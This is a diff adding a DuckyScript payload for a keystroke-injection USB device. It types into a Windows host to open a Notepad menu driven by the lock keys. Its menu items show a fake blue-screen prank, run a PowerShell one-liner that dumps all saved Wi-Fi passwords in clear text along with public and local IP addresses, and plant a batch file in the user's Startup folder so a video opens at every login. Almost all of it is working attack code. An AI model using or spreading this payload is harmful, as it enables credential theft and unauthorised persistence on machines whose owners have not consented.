@@ -1,0 +1,443 @@
+REM TITLE: Notepad Menu Navigated by Lock Keys
+REM AUTHOR: RootJunky
+REM VERSION: 3.0
+REM DUCKYSCRIPT: 3.0
+REM COMPATABILITY: Windows
+REM
+REM Opens Notepad (the "screen"), draws a menu, then lets the operator
+REM drive it with the keyboard lock keys:
+REM     NUM LOCK    = move DOWN  (wraps to top - works without Scroll Lock)
+REM     SCROLL LOCK = move UP    (wraps to bottom)
+REM     CAPS LOCK   = SELECT / run the marked item
+REM
+REM 10 runnable items (MENU1()..MENU10()) + Exit.
+REM To add a payload: put a label in #LABELxx below and your code
+REM inside the matching FUNCTION MENUx().
+
+REM ====================== MENU LABELS ======================
+REM Text shown in Notepad for each item - edit these freely.
+DEFINE #LABEL01 Windows Crash prank
+DEFINE #LABEL02 WiFi Info
+DEFINE #LABEL03 Rickroll on Startup
+DEFINE #LABEL04 Menu 4
+DEFINE #LABEL05 Menu 5
+DEFINE #LABEL06 Menu 6
+DEFINE #LABEL07 Menu 7
+DEFINE #LABEL08 Menu 8
+DEFINE #LABEL09 Menu 9
+DEFINE #LABEL10 Menu 10
+
+REM ====================== CONFIG ======================
+REM Highest 0-based index. Items 0..9 = MENU1..MENU10, 10 = Exit.
+DEFINE #MAXSEL 10
+
+REM ====================== STATE ======================
+REM Currently marked item (0-based)
+VAR $sel = 0
+REM Last item that ran (0 = none yet, otherwise 1..10)
+VAR $last = 0
+REM Previous lock states, for change detection
+VAR $pNUM = FALSE
+VAR $pSCR = FALSE
+VAR $pCAP = FALSE
+REM Counters used by CAPS_OFF()
+VAR $capTry = 0
+VAR $capWait = 0
+
+REM ====================== HELPERS ======================
+
+REM Force CAPS LOCK OFF and VERIFY it, so typed text keeps correct case.
+REM Presses CAPSLOCK, then waits (up to 500ms) for the host to confirm
+REM the LED is off. Retries up to 3 times if the host never confirms.
+REM Only presses again after a full wait, so it can't toggle CAPS back on.
+FUNCTION CAPS_OFF()
+    $capTry = 0
+    WHILE (($_CAPSLOCK_ON == TRUE) && ($capTry < 3))
+        CAPSLOCK
+        $capWait = 0
+        WHILE (($_CAPSLOCK_ON == TRUE) && ($capWait < 10))
+            DELAY 50
+            $capWait = ($capWait + 1)
+        END_WHILE
+        $capTry = ($capTry + 1)
+    END_WHILE
+    DELAY 100
+END_FUNCTION
+
+REM Read the current lock states into the "previous" vars
+FUNCTION SYNC_LOCKS()
+    $pNUM = $_NUMLOCK_ON
+    $pSCR = $_SCROLLLOCK_ON
+    $pCAP = $_CAPSLOCK_ON
+END_FUNCTION
+
+REM Wipe Notepad and redraw the full menu with the marker on $sel
+FUNCTION DRAW_MENU()
+    CTRL a
+    DELAY 40
+    STRING ==== DUCKY MENU ====
+    ENTER
+    STRING NUM=Down  SCROLL=Up  CAPS=Select
+    ENTER
+    ENTER
+
+    IF ($sel == 0) THEN
+        STRING [>] 01. #LABEL01
+    ELSE
+        STRING [ ] 01. #LABEL01
+    END_IF
+    ENTER
+
+    IF ($sel == 1) THEN
+        STRING [>] 02. #LABEL02
+    ELSE
+        STRING [ ] 02. #LABEL02
+    END_IF
+    ENTER
+
+    IF ($sel == 2) THEN
+        STRING [>] 03. #LABEL03
+    ELSE
+        STRING [ ] 03. #LABEL03
+    END_IF
+    ENTER
+
+    IF ($sel == 3) THEN
+        STRING [>] 04. #LABEL04
+    ELSE
+        STRING [ ] 04. #LABEL04
+    END_IF
+    ENTER
+
+    IF ($sel == 4) THEN
+        STRING [>] 05. #LABEL05
+    ELSE
+        STRING [ ] 05. #LABEL05
+    END_IF
+    ENTER
+
+    IF ($sel == 5) THEN
+        STRING [>] 06. #LABEL06
+    ELSE
+        STRING [ ] 06. #LABEL06
+    END_IF
+    ENTER
+
+    IF ($sel == 6) THEN
+        STRING [>] 07. #LABEL07
+    ELSE
+        STRING [ ] 07. #LABEL07
+    END_IF
+    ENTER
+
+    IF ($sel == 7) THEN
+        STRING [>] 08. #LABEL08
+    ELSE
+        STRING [ ] 08. #LABEL08
+    END_IF
+    ENTER
+
+    IF ($sel == 8) THEN
+        STRING [>] 09. #LABEL09
+    ELSE
+        STRING [ ] 09. #LABEL09
+    END_IF
+    ENTER
+
+    IF ($sel == 9) THEN
+        STRING [>] 10. #LABEL10
+    ELSE
+        STRING [ ] 10. #LABEL10
+    END_IF
+    ENTER
+
+    IF ($sel == 10) THEN
+        STRING [>] 11. Exit
+    ELSE
+        STRING [ ] 11. Exit
+    END_IF
+    ENTER
+
+    ENTER
+    IF ($last == 0) THEN
+        STRING Status: ready
+    ELSE IF ($last == 1) THEN
+        STRING Status: ran #LABEL01
+    ELSE IF ($last == 2) THEN
+        STRING Status: ran #LABEL02
+    ELSE IF ($last == 3) THEN
+        STRING Status: ran #LABEL03
+    ELSE IF ($last == 4) THEN
+        STRING Status: ran #LABEL04
+    ELSE IF ($last == 5) THEN
+        STRING Status: ran #LABEL05
+    ELSE IF ($last == 6) THEN
+        STRING Status: ran #LABEL06
+    ELSE IF ($last == 7) THEN
+        STRING Status: ran #LABEL07
+    ELSE IF ($last == 8) THEN
+        STRING Status: ran #LABEL08
+    ELSE IF ($last == 9) THEN
+        STRING Status: ran #LABEL09
+    ELSE IF ($last == 10) THEN
+        STRING Status: ran #LABEL10
+    END_IF
+END_FUNCTION
+
+REM ====================== MENU ITEMS ======================
+REM Put your payloads inside these. If one opens another window
+REM (PowerShell etc.), it MUST put focus back on Notepad before it
+REM ends, because the next redraw types CTRL A + text into whatever
+REM window has focus.
+
+FUNCTION MENU1()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL01 payload goes here]
+    DELAY 1000
+    GUI r
+    DELAY 500
+    STRING https://upload.wikimedia.org/wikipedia/commons/5/56/Bsodwindows10.png
+    ENTER
+    DELAY 1000
+    F11
+    DELAY 500
+    $last = 1
+END_FUNCTION
+
+FUNCTION MENU2()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL02 payload goes here]
+DELAY 500
+    GUI r
+    DELAY 1000
+    STRING Powershell
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    ENTER
+    STRING $PublicIP = "Your-Public-IP-Address"
+    ENTER
+    STRING $LocalIP = "Your-Local-IP-Address"
+    ENTER
+    STRING $computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+    ENTER
+    STRING $Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
+    ENTER
+    STRING $Wifi = (netsh wlan show profiles) | Select-String ":(.+)$" | % {$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | % {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+    ENTER
+    STRING clear
+    ENTER
+    STRING $Wifi + $PublicIP + $computerPubIP + $LocalIP + $Networks.ipaddress[0]
+    ENTER
+    DELAY 5000
+    STRING exit
+    ENTER
+    DELAY 1000
+    $last = 2
+END_FUNCTION
+
+FUNCTION MENU3()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL03 payload goes here]
+    DELAY 500
+    GUI r
+    DELAY 500
+    STRING cmd
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING ECHO echo off > "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING ECHO mode con:cols=30 lines=10 >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING ECHO start https://youtu.be/sXwaRjU7Tj0?t=57 >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING ECHO exit >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.bat"
+    DELAY 500
+    ENTER
+    STRING exit
+    ENTER
+    LED_R
+    DELAY 1000
+    LED_OFF
+    $last = 3
+END_FUNCTION
+
+FUNCTION MENU4()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL04 payload goes here]
+    $last = 4
+END_FUNCTION
+
+FUNCTION MENU5()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL05 payload goes here]
+    $last = 5
+END_FUNCTION
+
+FUNCTION MENU6()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL06 payload goes here]
+    $last = 6
+END_FUNCTION
+
+FUNCTION MENU7()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL07 payload goes here]
+    $last = 7
+END_FUNCTION
+
+FUNCTION MENU8()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL08 payload goes here]
+    $last = 8
+END_FUNCTION
+
+FUNCTION MENU9()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL09 payload goes here]
+    $last = 9
+END_FUNCTION
+
+FUNCTION MENU10()
+    REM Caps OFF first - selecting with CAPS may have turned it on
+    CAPS_OFF()
+    REM [#LABEL10 payload goes here]
+    $last = 10
+END_FUNCTION
+
+FUNCTION MENU_EXIT()
+    CAPS_OFF()
+    CTRL a
+    DELAY 40
+    DELETE
+    DELAY 100
+    ALT F4
+    DELAY 800
+    ALT n
+    DELAY 300
+    RESTORE_HOST_KEYBOARD_LOCK_STATE
+    STOP_PAYLOAD
+END_FUNCTION
+
+REM Branch to the handler for the marked item
+FUNCTION DO_SELECT()
+    IF ($sel == 0) THEN
+        MENU1()
+    ELSE IF ($sel == 1) THEN
+        MENU2()
+    ELSE IF ($sel == 2) THEN
+        MENU3()
+    ELSE IF ($sel == 3) THEN
+        MENU4()
+    ELSE IF ($sel == 4) THEN
+        MENU5()
+    ELSE IF ($sel == 5) THEN
+        MENU6()
+    ELSE IF ($sel == 6) THEN
+        MENU7()
+    ELSE IF ($sel == 7) THEN
+        MENU8()
+    ELSE IF ($sel == 8) THEN
+        MENU9()
+    ELSE IF ($sel == 9) THEN
+        MENU10()
+    ELSE IF ($sel == 10) THEN
+        MENU_EXIT()
+    END_IF
+END_FUNCTION
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+REM ====================== STARTUP ======================
+DELAY 1000
+SAVE_HOST_KEYBOARD_LOCK_STATE
+
+REM Open Notepad via the Run dialog
+GUI r
+DELAY 700
+STRING notepad
+ENTER
+DELAY 1500
+REM Fresh blank doc/tab so CTRL A never wipes a restored Win11 tab
+CTRL n
+DELAY 800
+
+CAPS_OFF()
+DRAW_MENU()
+DELAY 200
+SYNC_LOCKS()
+
+REM ====================== MAIN LOOP ======================
+WHILE (TRUE)
+    DELAY 50
+
+    IF ($_NUMLOCK_ON != $pNUM) THEN
+        REM NUM LOCK changed -> DOWN (wrap to top)
+        $pNUM = $_NUMLOCK_ON
+        IF ($sel < #MAXSEL) THEN
+            $sel = ($sel + 1)
+        ELSE
+            $sel = 0
+        END_IF
+        DRAW_MENU()
+
+    ELSE IF ($_SCROLLLOCK_ON != $pSCR) THEN
+        REM SCROLL LOCK changed -> UP (wrap to bottom)
+        $pSCR = $_SCROLLLOCK_ON
+        IF ($sel > 0) THEN
+            $sel = ($sel - 1)
+        ELSE
+            $sel = #MAXSEL
+        END_IF
+        DRAW_MENU()
+
+    ELSE IF ($_CAPSLOCK_ON != $pCAP) THEN
+        REM CAPS LOCK changed -> SELECT
+        CAPS_OFF()
+        DO_SELECT()
+        REM Let the host's LED reports settle before re-reading states
+        DELAY 300
+        SYNC_LOCKS()
+        DRAW_MENU()
+    END_IF
+END_WHILE
